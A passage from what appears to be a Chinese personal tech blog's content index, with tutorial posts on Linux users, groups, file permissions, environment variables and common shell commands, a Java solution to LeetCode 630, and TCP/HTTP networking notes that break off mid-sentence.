sudo userdel -r test$ ls /home/virgil 修改用户 usermod 是所有修改工具最强大一个，可以修改 passwd 文件中的大部分字段： -l 修改用户账户的登录名。 -L 锁定账户，使用户无法登录。 -p 修改账户的密码。 -U 解除锁定，使用户能够登录。 passwd 和 chpasswd 可以用于修改密码，任何用户都可以使用 passwd 修改自己的密码，只有管理员才能修改其他人的密码。当要同时修改大量用户的密码时，chpasswd 命令支持标准输入自动读取登录名和密码对（由冒号分割）列表。 chsh, chage chsh 可以用于更改用户的默认shell，必须填写shell可执行文件的完整路径名。chage 可用于修改用户账户的有效期，可以修改 shadow 文件的后几个和账户密码过期时间有关的参数。 用户组 用户账户在控制单个用户安全性方面很好用，但涉及在共享资源的一组用户时就比较麻烦了。为了解决这个问题，Linux系统采用了另外一个安全概念——组（group）。组权限允许多个用户对系统中的对象（比如文件、目录或设备等）共享一组共用的权限。同样的每个组都有一个唯一的GID。 /etc/group 文件 etc/group 文件包含系统上用到的每个组的信息。 1234567$ cat /etc/grouproot:x:0:daemon:x:1:bin:x:2:sys:x:3:adm:x:4:syslog,virgiltty:x:5: 每个字段分别代表： 组名 组密码 GID 属于该组的用户列表 在列表中，有些组并没有列出用户。 这并不是说这些组没有成员。当一个用户在/etc/passwd文件中指定某个组作为默认组时， 那么这个用户的账户不会作为该组成员再出现在/etc/group文件中 切记不要直接修改 group 文件来将用户添加到一个组，要使用 usermod 命令。 创建修改组 groupadd 命令可在系统上创建新组，新的组默认没有用户，可以使用 usermod 命令将用户加入新的组，-G 参数表示把这个新组添加到该用户的组列表里，使用 -g 则会覆盖用户原有的组。 123456$ sudo groupadd shared$ tail -1 /etc/groupshared:x:1001:$ sudo usermod -G shared virgil$ tail -1 /etc/groupshared:x:1001:virgil groupmod 命令可以修改已有组的 GID（加 -g 选项）或组名（加 -n 选项）。 文件权限 文件权限符 当使用 ls -l 命令时我们会有如下输出： 12345$ ls -ltotal 62080drwxr-xr-x 3 virgil virgil 4096 May 13 22:11 cdrwxr-xr-x 3 virgil virgil 4096 Oct 18 18:48 cf-project-rw-r--r-- 1 virgil virgil 63476994 Jul 23 11:08 cide.deb 输出结果的第一个字段就是描述文件和目录权限的编码： 第一个字段表示了对象的类型： - 代表文件 d 代表目录 l 代表链接 c 代表字符型设备 b 代表块设备 n 代表网络设备 之后有3组三字符的编码。这三组分别代表： 对象的属主的权限 对象的属组的权限 其他用户的权限 每一组中的每个字符分别代表 r 代表可读 w 代表可写 x 代表可执行 如果对应位置是 -，那么代表没有此权限 默认文件权限 umask 命令用来创建文件和目录的默认权限： 123456$ rm new file$ touch newfile$ ls -al newfile -rw-r--r-- 1 virgil virgil 0 Nov 8 17:23 newfile$ umask0022 umask 的第一位代表黏着位，这个我们后面再说。后面三位代表的则是文件权限的&quot;遮罩&quot;,首先我们了解一下我们是如何使用八进制表示文件权限的。 对于一个文件的一组 rwx 属性，我们一共有8种可能（2^3)，例如 -wx -&gt; 011 -&gt; 3。对于默认的 umask 0022 这个值来说，第一位是黏着位我们不看，对于后三位： 12345666 -&gt; 110 110 110 -&gt; rw-rw-rw- 全部权限 --- --- --- 减去022 -&gt; 000 010 010 -&gt; 遮罩 === === ===644 -&gt; 110 100 100 -&gt; rw-r--r-- 默认权限 改变安全性设置 更改权限 chmod 命令用来改变文件和目录的安全性设置。默认格式是： 12chmod [OPTION]... MODE[,MODE]... FILE...chmod [OPTION]... OCTAL-MODE FILE... 其中， octal-mode 代表的是三位的八进制代码，例如： 12345$ ls -l test.txt-rw-r--r-- 1 virgil virgil 48 Nov 4 20:46 test.txt$ chmod 666 test.txt$ ls -l test.txt -rw-rw-rw- 1 virgil virgil 48 Nov 4 20:46 test.txt 另外你也可以使用符号模式来进行快速的操作，这样就不需要去记住八进制代码了，在符号模式中： u 代表所属用户 g 代表所属组 o 代表其他用户 a 代表全部 在想要操作的权限作用对象后，更上 +|-|= 来代表要增加，移除或者赋值。后面再更上 r|w|x 代表想要赋予，删除，复制的权限。例如如果想要去掉组对于文件的修改权限： 12345$ ls -l test.txt-rw-rw-rw- 1 virgil virgil 48 Nov 4 20:46 test.txt$ chmod g-w test.txt$ ls -l test.txt-rw-r--rw- 1 virgil virgil 48 Nov 4 20:46 test.txt 更改所属关系 chown 和 chgrp 命令可以用于更改文件的属组和属主。例如我们创建一个只有所属者可读可写的文件： 12$ ls -l test.txt -rw------- 1 virgil virgil 48 Nov 4 20:46 test.txt 然后使用 sudo 将其所属者更改为 root，再尝试查看文件: 123$ sudo chown root test.txt $ cat test.txt cat: test.txt: Permission denied 只有root用户能够改变文件的属主。任何属主都可以改变文件的属组，但前提是属主必须 是原属组和目标属组的成员。 共享文件 创建新文件时，Linux会用你默认的UID和GID给文件分配权限， 如果想要在大范围内共享文件，那么每次都使用 chmod 或者 chgrp 就会很麻烦， 为了解决此问题，Linux还为每个文件和目录存储了3个额外的信息位。 设置用户ID（SUID） 当文件被用户使用时，程序会以文件属主的权限运行。SUID 一般只对二进制文件有效，当执行该二进制文件时，执行者会在程序执行过程中短暂获取文件所有者的权限。例如 passwd 命令: 12$ ls -l /usr/bin/passwd-rwsr-xr-x 1 root root 59640 Mar 22 2019 /usr/bin/passwd 在其所有者（root）的执行权限上是 s 而不是 x，这就代表这个文件有 SUID。我们知道所有用户的密码都是储存在 /etc/shadow 这个文件里的，只有root用户才有修改和读取的权限。但是当我们执行 passwd 时，因为SUID，我们短暂获取了 root 用户的的权限，可以对 /etc/shadow 进行修改。 设置组ID（SGID） 与SUID一样，对二进制文件来说，执行过程中会短暂获得文件属组的权限。不同的是，对目录来说，目录中创建的新文件会以目录的默认属组作为默认属组。在共享文件时，通过设置共享目录的SGID，所有新创建文件的默认组都会是目录的数组，避免了手动更改属组的麻烦。 现在我们创建一个 shared 组，并创建一个共享文件夹 share，将文件夹的默认组更改为 shared。 1234$ mkdir share$ chgrp shared share/$ ls -l | grep sharedrwxr-xr-x 2 virgil shared 4096 Nov 15 17:22 share 现在我们设置SGID，SGID可以通过 chmod 命令的八进制代码模式设置，其中： 1 代表黏着位 2 代表SGID 4 代表SUID 多种组合只需要相加，例如同时设置SGID和SUID为 6 1234567$ mkdir share$ chgrp shared share/$ ls -l | grep sharedrwxr-xr-x 2 virgil shared 4096 Nov 15 17:22 share$ chmod 2755 share$ ls -l | grep sharedrwxr-sr-x 2 virgil shared 4096 Nov 15 17:22 share 此时如果我们进入此目录创建一个新的文件： 123456$ cd share/$ ls$ touch test.txt$ ls -ltotal 0-rw-r--r-- 1 virgil shared 0 Nov 15 17:34 test.txt 可以看到文件的默认组就为shared，现在默认创建的文件对于属组来说还没有写入权限，和 Other 相同，我们可以通过修改 umask 来修改创建的文件的默认权限： 123456$ umask 002$ touch test2.txt$ ls -ltotal 0-rw-r--r-- 1 virgil shared 0 Nov 15 17:34 test.txt-rw-rw-r-- 1 virgil shared 0 Nov 15 17:36 test2.txt 这样我们就实现了文件在组内的共享。 粘着位 进程结束后文件还驻留（粘着）在内存中。","categories":[{"name":"Linux","slug":"Linux","permalink":"https://virgilchen97.github.io/categories/Linux/"}],"tags":[{"name":"Shell","slug":"Shell","permalink":"https://virgilchen97.github.io/tags/Shell/"}]},{"title":"Linux环境变量","slug":"Linux环境变量","date":"2020-11-07T13:28:48.000Z","updated":"2022-01-26T13:48:43.537Z","comments":true,"path":"2020/11/Linux环境变量/","link":"","permalink":"https://virgilchen97.github.io/2020/11/Linux%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/","excerpt":"","text":"使用Linux环境变量 全局环境变量 可以使用 printenv 命令查看所有的环境变量，也可以在后面加上环境变量得名称，获取具体的环境变量的值： 12$ printenv HOME/home/virgil 全局环境变量可以作用于所有子shell： 12345$ printenv HOME/home/virgil$ bash$ printenv HOME/home/virgil 局部环境变量 在Linux系统并没有一个只显示局部环境变量的命令。set 命令会显示为某个特定进程设置的所有环境变量，包括局部变量、全局变量以及用户定义变量。 设置一个局部变量 我们只要简单的使用一个 = 就可以设置一个环境变量，注意转义空格。 123$ my_var=123$ echo $my_var 123 由于这是一个局部变量，因此当我们进入一个子shell以后，这个变量就变得不可见了： 123456$ my_var=123$ echo $my_var 123$ bash$ echo $my_var 设置一个全局环境变量 创建全局环境变量的方法是先创建一个局部环境变量，然后使用 export 把它导出到全局环境中。 1234567$ my_var=123$ export my_var$ echo $my_var 123$ bash$ echo $my_var 123 可以看到在进入了子shell后，我们定义的环境变量仍然可以被访问到。但是如果在子shell中对全局变量进行修改，那么这样的修改就只在子shell中有效 删除环境变量 unset 命令可以用于删除环境变量，但是对于一个全局变量来说，在子shell中删除只对子shell有效，在父进程中该环境变量依然可见： 12345678910111213$ echo $my_var 123$ bash$ echo $my_var 123$ unset my_var $ echo $my_var $ exitexit$ echo $my_var 123$ Path 环境变量 当你在shell命令行界面中输入一个外部命令时，shell必须搜索系统来找到对应的程序。PATH环境变量定义了用于进行命令和程序查找的目录。如果命令或者程序的位置没有包括在PATH变量中，那么如果不使用绝对路径的话，shell是没法找到的。 12echo $PATH/home/virgil/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games: Path的各个目录之间使用 : 分割，想要添加一个新的路径，我们只需要引用原有的 PATH 的值，在连接上新的路径就可以了： 1$ PATH=$PATH:/usr/bin 注意这样修改的PATH只能维持到退出或重启系统，永久修改的方法接下来回提到。 系统环境变量 在登入Linux系统启动一个bash shell时，默认情况下bash会在几个文件中查找命令。这些文件叫作启动文件或环境文件。bash检查的启动文件取决于你启动bash shell的方式。启动bash shell有3种方式： 登录时作为默认登录shell 作为非登录shell的交互式shell 作为运行脚本的非交互shell 下面我们介绍bash shell在不同的方式下启动文件。 登录 Shell 登录 Shell 会从五个文件中读取命令： /etc/profile $HOME/.bash_profile $HOME/.bashrc $HOME/.bash_login $HOME/.profile /etc/profile 是系统默认的Shell启动文件，所有用户登录时都会执行。在这个文件中，一般都会有一个for语句来迭代所有 /etc/profile.d 目录下的文件，这些文件可以是特定应用的启动文件， 12345678910$ ls -l /etc/profile.dtotal 28-rw-r--r-- 1 root root 96 Aug 19 2018 01-locale-fix.sh-rw-r--r-- 1 root root 1557 Dec 4 2017 Z97-byobu.sh-rwxr-xr-x 1 root root 3417 Mar 11 2019 Z99-cloud-locale-test.sh -rwxr-xr-x 1 root root 873 Mar 11 2019 Z99-cloudinit-warnings.sh-rw-r--r-- 1 root root 833 Oct 8 02:30 apps-bin-path.sh-rw-r--r-- 1 root root 664 Apr 1 2018 bash_completion.sh-rw-r--r-- 1 root root 1003 Dec 29 2015 cedilla-portuguese.shlrwxrwxrwx 1 root root 34 Dec 11 2019 wsl-integration.sh -&gt; /usr/share/wslu/wsl-integration.sh $HOME 目录下的启动文件则是用户专属的启动文件，可以用来定义用户的环境变量，shell会按照按照下列顺序，运行第一个被找到的文件，余下的则被忽略： $HOME/.bash_profile $HOME/.bash_login $HOME/.profile 交互式shell进程 如果bash是作为交互式shell启动的，它就不会访问/etc/profile文件，只会检查用户HOME目录中的 .bashrc 文件。如果想要持久化你定义的环境变量，那么可以将他们放到你的HOME目录中的 .bashrc 文件中。 非交互shell 系统执行shell脚本时用的就是这种shell。非交互shell是没有命令行提示符的。在启动非交互shell时想要执行一些命令的话（就像 .bashrc）那么可以设置 BASH_ENV 环境变量。 如果未设置 BASH_ENV，那么非交互Shell可以从启动它的父shell那里获得环境变量（仅限于全局）","categories":[{"name":"Linux","slug":"Linux","permalink":"https://virgilchen97.github.io/categories/Linux/"}],"tags":[{"name":"Shell","slug":"Shell","permalink":"https://virgilchen97.github.io/tags/Shell/"}]},{"title":"Linux 常用命令","slug":"Linux命令行","date":"2020-11-04T09:21:40.000Z","updated":"2022-01-26T13:48:43.537Z","comments":true,"path":"2020/11/Linux命令行/","link":"","permalink":"https://virgilchen97.github.io/2020/11/Linux%E5%91%BD%E4%BB%A4%E8%A1%8C/","excerpt":"","text":"常用 Bash Shell 命令 监测程序 查看进程 ps 命令输出运行在系统上的所有程序的许多信息 12345$ ps PID TTY TIME CMD 775 pts/1 00:00:00 bash 912 pts/1 00:00:00 bash 920 pts/1 00:00:00 ps ps -ef 显示所有进程，显示完整格式输出 1234567891011$ ps -efUID PID PPID C STIME TTY TIME CMDroot 1 0 0 17:19 ? 00:00:00 /initroot 7 1 0 17:19 ? 00:00:00 /initroot 8 7 0 17:19 ? 00:00:00 /initvirgil 9 8 0 17:19 pts/0 00:00:00 -zshroot 773 1 0 17:23 ? 00:00:00 /initroot 774 773 0 17:23 ? 00:00:00 /initvirgil 775 774 0 17:23 pts/1 00:00:00 /bin/bash --loginvirgil 912 775 0 17:24 pts/1 00:00:00 bashvirgil 1362 912 0 17:36 pts/1 00:00:00 ps -ef 参数 含义 UID 启动进程的用户 PID 进程号 PPID 父进程进程号 C 生命周期中CPU利用率 STIME 进程启动时的系统时间 TTY 进程启动时的终端设备 TIME 进程累计的CPU时间 CMD 程序名称 时实查看进程 top 命令会显示时实更新的进程信息 load average: 系统最近1分钟，5分钟，15分钟的平均负载 参数 含义 PID 进程号 USER 所属用户 PR 优先级 NI 谦让度 VIRT 虚拟内存消耗 RES 物理内存消耗 SHR 共享内存大小 S 进程状态 %CPU 进程使用的CPU时间比例 %MEM 进程使用的内存占可用内存的比例 Time+ 自进程启动到目前为止的CPU时间总量 COMMAND 启动的程序名 开启 top 后可以按 h 来获取交互命令的帮助。 结束进程 kill 命令可以通过发送 TERM 信号给进程来结束进程，没有任何输出。 12$ kill 9$ 想要发送信号，你必须是进程所有者或者root。可以通过 -s 或者 -&lt;signal&gt;参数指定其他的信号 信号 名称 含义 1 HUP 挂起 2 INT 中断 9 KILL 无条件终止 11 SEGV 段错误 15 TERM 尽可能终止 17 STOP 无条件停止运行，但不终止 18 TSTP 停止或暂停，但继续在后台运行 19 CONT 在STOP或TSTP之后恢复执行 所以我们常见的杀死进程的命令 kill -9 &lt;pid&gt; 的含义就是发送KILL信号给对应进程。 killall 命令更加强大，支持通过进程名来终止进程，可以使用通配符 磁盘空间 挂载卸载 mount 命令用来将设备挂载到一个挂载点，当不加任何参数时，会显示目前所有挂载的设备 123$ mount/dev/sdb on / type ext4 (rw,relatime,discard,errors=remount-ro,data=ordered)(后面的省略了) 从左到右分别为 媒体的设备文件名（/dev/sdb） 挂载点（/） 文件系统（ext4） 访问状态（rw,relatime,discard,errors=remount-ro,data=ordered） 想要挂载设备一般使用 mount -t &lt;fstype&gt; &lt;device&gt; &lt;dir&gt; umount 则是用来卸载设备，使用 umount &#123;directory|device&#125; 来卸载设备。卸载设备时如果有任何设备上的文件正在被使用便无法卸载，可以使用 lsof 命令查看当前设备上的有哪些文件正在被使用。 查看剩余空间 df 命令可以查看设备上剩余的磁盘空间： 12345678$ df -hFilesystem Size Used Avail Use% Mounted on/dev/sdb 251G 14G 225G 6% /tmpfs 6.3G 0 6.3G 0% /mnt/wsltools 953G 544G 410G 58% /inittmpfs 6.3G 0 6.3G 0% /sys/fs/cgroupC:\\ 953G 544G 410G 58% /mnt/cD:\\ 1.9T 1.2T 695G 63% /mnt/d -h 参数能让输出中的磁盘空间按照用户易读的形式显示。 du 命令可以查看某个特定目录（默认情况下是当前目录）的磁盘使用情况，-h 按用户易读的格式输出， -d 指定深度: 12345$ du -hd 132K ./src20K ./.idea348K ./lib32K ./bin 处理数据文件 排序 sort 命令可以用来排序数据，默认情况下会按照默认语言的排序规则对文本文件中的数据行排序。使用 -n 将文本当作数字，按照数字值来排序。-t 参数可以用于指定分割符，-k 参数可以指定按照分隔符分割后按照哪些列来排序 123456789101112131415161718$ cat test.txt alice 1 5frank 2 4david 3 3tom 4 2jerry 5 1$ sort -t &#x27; &#x27; -k 1 test.txt alice 1 5david 3 3frank 2 4jerry 5 1tom 4 2virgil@Virgil-Y7KP:~$ sort -t &#x27; &#x27; -k 3 test.txtjerry 5 1tom 4 2david 3 3frank 2 4alice 1 5 搜索 可以使用 grep 命令来搜索数据 123456789101112131415$ cat test.txt alice 1 5frank 2 4david 3 3tom 4 2jerry 5 1$ grep alice test.txt alice 1 5$ grep -vn alice test.txt (反向搜索+显示匹配行号)frank 2 4david 3 3tom 4 2jerry 5 1$ grep -c [12] test.txt (正则表达式+匹配行数量)4 理解 shell shell 的父子关系 启动子shell 我们可以在一个shell中启动另外一个shell程序，包括自己： 1234$ bash$ bash$ bash$ 看起来没有效果，但是如果使用我们之前学到的 ps 命令 1234567$ ps -f --forestUID PID PPID C STIME TTY TIME CMDvirgil 20692 20691 0 14:33 pts/0 00:00:00 /bin/bash --loginvirgil 20722 20692 0 14:33 pts/0 00:00:00 \\_ bashvirgil 20733 20722 0 14:33 pts/0 00:00:00 \\_ bashvirgil 20750 20733 0 14:33 pts/0 00:00:00 \\_ bashvirgil 20968 20750 0 14:36 pts/0 00:00:00 \\_ ps -f --forest 可以发现我们每一次都创建了一个子shell，子shell的父进程ID就是父shell。同样的我们可以用 exit 来方便的退出当前shell: 12345678$ exitexit$ ps -f --forestUID PID PPID C STIME TTY TIME CMDvirgil 20692 20691 0 14:33 pts/0 00:00:00 /bin/bash --loginvirgil 20722 20692 0 14:33 pts/0 00:00:00 \\_ bashvirgil 20733 20722 0 14:33 pts/0 00:00:00 \\_ bashvirgil 21224 20733 0 14:38 pts/0 00:00:00 \\_ ps -f --forest 进程列表 再shell中我们可以再一行中输入多个命令，只要使用 ; 分割就可以： 12345678$ pwd ; ls ; cd /etc ; pwd ; cd ; pwd ; ls/home/virgilApp Go LeetCode-solutions Vblog cf-project go myblog test.txtDownload Java LeetCodeCN-Submissions-Crawler c cide.deb go.mod snap/etc/home/virgilApp Go LeetCode-solutions Vblog cf-project go myblog test.txtDownload Java LeetCodeCN-Submissions-Crawler c cide.deb go.mod snap 但是如果在这些命令的外部添加小括号： 12345678$ (pwd ; ls ; cd /etc ; pwd ; cd ; pwd ; ls)/home/virgilApp Go LeetCode-solutions Vblog cf-project go myblog test.txtDownload Java LeetCodeCN-Submissions-Crawler c cide.deb go.mod snap/etc/home/virgilApp Go LeetCode-solutions Vblog cf-project go myblog test.txtDownload Java LeetCodeCN-Submissions-Crawler c cide.deb go.mod snap 结果并没有什么不同，但是实际上我们如果在括号内添加一条命令来查看进程：\\ 123456789101112$ (pwd ; ls ; cd /etc ; pwd ; cd ; pwd ; ls ; ps -f --forest)/home/virgilApp Go LeetCode-solutions Vblog cf-project go myblog test.txtDownload Java LeetCodeCN-Submissions-Crawler c cide.deb go.mod snap/etc/home/virgilApp Go LeetCode-solutions Vblog cf-project go myblog test.txtDownload Java LeetCodeCN-Submissions-Crawler c cide.deb go.mod snapUID PID PPID C STIME TTY TIME CMDvirgil 21450 21449 0 14:40 pts/0 00:00:00 /bin/bash --loginvirgil 21926 21450 0 14:44 pts/0 00:00:00 \\_ /bin/bash --loginvirgil 21929 21926 0 14:44 pts/0 00:00:00 \\_ ps -f --forest 你会发现括号内的命令其实是在一个子shell中运行的，命令运行完后子shell便会退出。 子shell妙用 我们可以使用后台模式让某个命令在后台运行，同时让出shell让我们可以做别的事情，例如 sleep 命令可以让产生指定时间的时延： 123$ sleep 3(过了三秒)$ 在这段时间内你输入的任何指令都是无效的，他们在sleep结束后才会被shell执行，但是如果在命令结尾添加一个 &amp; 那么sleep命令就会被置入后台，shell也不会被占用，同时终端会返回后台任务的作业号和PID 123$ sleep 3 &amp;[1] 24210$ 我们整一个长时间的sleep来观察一下： 1234567$ sleep 20 &amp;[1] 24338$ ps -fUID PID PPID C STIME TTY TIME CMDvirgil 21450 21449 0 14:40 pts/0 00:00:00 /bin/bash --loginvirgil 24338 21450 0 15:12 pts/0 00:00:00 sleep 20virgil 24339 21450 0 15:12 pts/0 00:00:00 ps -f sleep命令确实在另外一个线程中运行了，对于在后台的任务，我们可以用 jobs 命令查看。 讲完后台命令后，同样的你可以把一个子shell（进程列表）置入后台，例如当你想使用tar命令归档多个目录，又想同时做一些其他的事情，那么你就可以： 123$ (tar -cf Rich.tar /home/rich ; tar -cf My.tar /home/christine)&amp; [3] 2423 $ shell 内置命令 例如 ps 这样的命令并不是shell内置的命令，在执行他们时，shell创建一个新的子线程去执行他们。同样的，shell也有许多内置命令，运行内部命令时shell不需要创建子线程去执行他们。 history 命令 想要查看最近使用过的命令，可以使用 history: 12345678910$ history 1 pwd ; ls ; cd /etc ; pwd ; cd ; pwd ; ls 2 cd 3 pwd ; ls ; cd /etc ; pwd ; cd ; pwd ; ls 4 (pwd ; ls ; cd /etc ; pwd ; cd ; pwd ; ls) 5 ps -f --forest 6 ```shell 7 $ (pwd ; ls ; cd /etc ; pwd ; cd ; pwd ; ls) 8 /home/virgil ... 想要快速重新执行上调指令，只需要输入 !!，想要快速执行之前的某条指令，只需要 !&lt;指令编号&gt;。 alias 别名 你你可以随时创建别名，例如 1234567$ alias li=&#x27;ls -li&#x27;$ litotal 2232 4503599628128469 -rwxrwxrwx 1 virgil virgil 1952 Jun 26 15:59 _config.yml 1970324837790266 -rwxrwxrwx 1 virgil virgil 2013043 Aug 14 23:21 db.json 8162774325390266 drwxrwxrwx 1 virgil virgil 4096 Jun 26 16:03 node_modules 3096224744602326 -rwxrwxrwx 1 virgil virgil 261591 Jun 26 16:03 package-lock.json","categories":[{"name":"Linux","slug":"Linux","permalink":"https://virgilchen97.github.io/categories/Linux/"}],"tags":[{"name":"Shell","slug":"Shell","permalink":"https://virgilchen97.github.io/tags/Shell/"}]},{"title":"630-课程表 III","slug":"630-课程表-III","date":"2020-09-21T15:46:17.000Z","updated":"2022-01-26T13:48:43.537Z","comments":true,"path":"2020/09/630-课程表-III/","link":"","permalink":"https://virgilchen97.github.io/2020/09/630-%E8%AF%BE%E7%A8%8B%E8%A1%A8-III/","excerpt":"这里有 n 门不同的在线课程，他们按从 1 到 n 编号。每一门课程有一定的持续上课时间（课程时间）t 以及关闭时间第 d 天。一门课要持续学习 t 天直到第 d 天时要完成，你将会从第 1 天开始。 给出 n 个在线课程用 (t, d) 对表示。你的任务是找出最多可以修几门课。 示例： 12345678输入: [[100, 200], [200, 1300], [1000, 1250], [2000, 3200]]输出: 3解释: 这里一共有 4 门课程, 但是你最多可以修 3 门:首先, 修第一门课时, 它要耗费 100 天，你会在第 100 天完成, 在第 101 天准备下门课。第二, 修第三门课时, 它会耗费 1000 天，所以你将在第 1100 天的时候完成它, 以及在第 1101 天开始准备下门课程。第三, 修第二门课时, 它会耗时 200 天，所以你将会在第 1300 天时完成它。第四门课现在不能修，因为你将会在第 3300 天完成它，这已经超出了关闭日期。 提示: 整数 1 &lt;= d, t,n &lt;= 10,000 。 你不能同时修两门课程。","text":"这里有 n 门不同的在线课程，他们按从 1 到 n 编号。每一门课程有一定的持续上课时间（课程时间）t 以及关闭时间第 d 天。一门课要持续学习 t 天直到第 d 天时要完成，你将会从第 1 天开始。 给出 n 个在线课程用 (t, d) 对表示。你的任务是找出最多可以修几门课。 示例： 12345678输入: [[100, 200], [200, 1300], [1000, 1250], [2000, 3200]]输出: 3解释: 这里一共有 4 门课程, 但是你最多可以修 3 门:首先, 修第一门课时, 它要耗费 100 天，你会在第 100 天完成, 在第 101 天准备下门课。第二, 修第三门课时, 它会耗费 1000 天，所以你将在第 1100 天的时候完成它, 以及在第 1101 天开始准备下门课程。第三, 修第二门课时, 它会耗时 200 天，所以你将会在第 1300 天时完成它。第四门课现在不能修，因为你将会在第 3300 天完成它，这已经超出了关闭日期。 提示: 整数 1 &lt;= d, t,n &lt;= 10,000 。 你不能同时修两门课程。 解法 在本题中我们首先想到的就是对所有课程按照最晚结束时间升序排列，因为早结束的课程我们肯定会优先安排。 接下来我们观察到，如果在第 0 天到第 i 天最多选择 k 门课程，那么有 c1 + c2 + ... + ck &lt;= di, 那么接下来在第 i + 1 天，如果 c1 + c2 + ... + ck + ci+1&lt;= di+1, 那么我们直接选择第 i+1 门课就行了。如果 c1 + c2 + ... + ck + ci+1 &gt;= di+1, 那么我们则可以挑选这 k + 1 天中耗时最长的课程从课程中删去，这样我们才会有最多的空余时间安排接下来的课程。 由于我们需要随时找出所有课程中时间最长的课程，因此我们使用大顶堆来解决。 代码 12345678910111213141516171819import java.util.*;class Solution &#123; public int scheduleCourse(int[][] courses) &#123; PriorityQueue&lt;Integer&gt; q = new PriorityQueue&lt;&gt;((a,b)-&gt;b-a); Arrays.sort(courses, (c1, c2) -&gt; c1[1] - c2[1]); int curr = 0; for (int [] course:courses) &#123; curr += course[0]; q.add(course[0]); if(curr &gt; course[1])&#123; curr -= q.poll(); &#125; &#125; return q.size(); &#125;&#125;","categories":[{"name":"LeetCode","slug":"LeetCode","permalink":"https://virgilchen97.github.io/categories/LeetCode/"}],"tags":[{"name":"优先队列","slug":"优先队列","permalink":"https://virgilchen97.github.io/tags/%E4%BC%98%E5%85%88%E9%98%9F%E5%88%97/"}]},{"title":"网络知识速查","slug":"网络知识速查","date":"2020-08-12T09:30:51.000Z","updated":"2022-01-26T13:48:43.537Z","comments":true,"path":"2020/08/网络知识速查/","link":"","permalink":"https://virgilchen97.github.io/2020/08/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86%E9%80%9F%E6%9F%A5/","excerpt":"","text":"TCP 报文结构 12345678910111213141516171819 0 1 2 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+| Source Port | Destination Port |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+| Sequence Number |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+| Acknowledgment Number |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+| Data | |U|A|P|R|S|F| || Offset| Reserved |R|C|S|S|Y|I| Window || | |G|K|H|T|N|N| |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+| Checksum | Urgent Pointer |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+| Options | Padding |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+| data |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ 三次握手 1. 第一次握手(SYN=1, seq=x): 客户端发送一个 TCP 的 SYN 标志位置1的包，指明客户端打算连接的服务器的端口，以及初始序号 X,保存在包头的序列号(Sequence Number)字段里。 发送完毕后，客户端进入 SYN_SEND 状态。 2. 第二次握手(SYN=1, ACK=1, seq=y, ACKnum=x+1): 服务器发回确认包(ACK)应答。即 SYN 标志位和 ACK 标志位均为1。服务器端选择自己 ISN 序列号，放到 Seq 域里，同时将确认序号(Acknowledgement Number)设置为客户的 ISN 加1，即X+1。 发送完毕后，服务器端进入 SYN_RCVD 状态。 3. 第三次握手(ACK=1，ACKnum=y+1) 客户端再次发送确认包(ACK)，SYN 标志位为0，ACK 标志位为1，并且把服务器发来 ACK 的序号字段+1，放在确定字段中发送给对方，并且在数据段放写ISN的+1 发送完毕后，客户端进入 ESTABLISHED 状态，当服务器端接收到这个包时，也进入 ESTABLISHED 状态，TCP 握手结束。 四次挥手 1. 第一次挥手(FIN=1，seq=x) 假设客户端想要关闭连接，客户端发送一个 FIN 标志位置为1的包，表示自己已经没有数据可以发送了，但是仍然可以接受数据。 发送完毕后，客户端进入 FIN_WAIT_1 状态。 2. 第二次挥手(ACK=1，ACKnum=x+1) 服务器端确认客户端的 FIN 包，发送一个确认包，表明自己接受到了客户端关闭连接的请求，但还没有准备好关闭连接。 发送完毕后，服务器端进入 CLOSE_WAIT 状态，客户端接收到这个确认包之后，进入 FIN_WAIT_2 状态，等待服务器端关闭连接。 3. 第三次挥手(FIN=1，seq=y) 服务器端准备好关闭连接时，向客户端发送结束连接请求，FIN 置为1。 发送完毕后，服务器端进入 LAST_ACK 状态，等待来自客户端的最后一个ACK。 4. 第四次挥手(ACK=1，ACKnum=y+1) 客户端接收到来自服务器端的关闭请求，发送一个确认包，并进入 TIME_WAIT状态，等待可能出现的要求重传的 ACK 包。 服务器端接收到这个确认包之后，关闭连接，进入 CLOSED 状态。 客户端等待了某个固定时间（两个最大段生命周期，2MSL，2 Maximum Segment Lifetime）之后，没有收到服务器端的 ACK ，认为服务器端已经正常关闭连接，于是自己也关闭连接，进入 CLOSED 状态。 HTTP 版本区别 HTTP 1.0 HTTP 1.0规定浏览器与服务器只保持短暂的连接，浏览器的每次请求都需要与服务器建立一个TCP连接，服务器完成请求处理后立即断开TCP连接，服务器不跟踪每个客户也不记录过去的请求。 多次请求需要重新握手多次，开销太大，无法复用连接 HTTP 1.1 HTTP 1.1支持持久连接（HTTP/1.1的默认模式使用带流水线的持久连接），在一个TCP连接上可以传送多个HTTP请求和响应，减少了建立和关闭连接的消耗和延迟。一个包含有许多图像的网页文件的多个请求和应答可以在一个连接中传输，但每个单独的网页文件的请求和应答仍然需要使用各自的连接。HTTP 1.1还允许客户端不用等待上一次请求结果返回，就可以发出下一次请求，但服务器端必须按照接收到客户端请求的先后顺序依次回送响应结果，以保证客户端能够区分出每次请求的响应内容，这样也显著地减少了整个下载过程所需要的时间。 HTTP 2.0 多路复用允许同时通过单一的 HTTP/2 连接发起多重的请求-响应消息。在 HTTP/1.1 